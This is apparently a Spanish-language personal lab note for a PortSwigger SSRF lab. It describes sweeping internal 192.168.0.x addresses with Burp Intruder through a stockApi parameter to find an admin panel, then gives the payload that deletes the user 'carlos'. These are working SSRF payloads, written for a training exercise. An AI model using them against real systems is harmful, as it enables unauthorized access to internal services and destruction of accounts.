Tags: #SSRF #PortSwigger 

# Lab 2 Basic SSRF against another back-end system


```bash 
# Debemos de descubir el panel de administrador de la sig IP: 192.168.0.x 
# Podemos usar el Intruder de BurpSuite para encontrar esa direccion 

stockApi=http://192.168.0.1:8080/admin    # Haremos un ataque Sniper para poder descubrir la IP correcta 


# una vez encontarda, procedemos a borrar al usuario 
stockApi=http://192.168.0.111:8080/admin/delete?username=carlos

```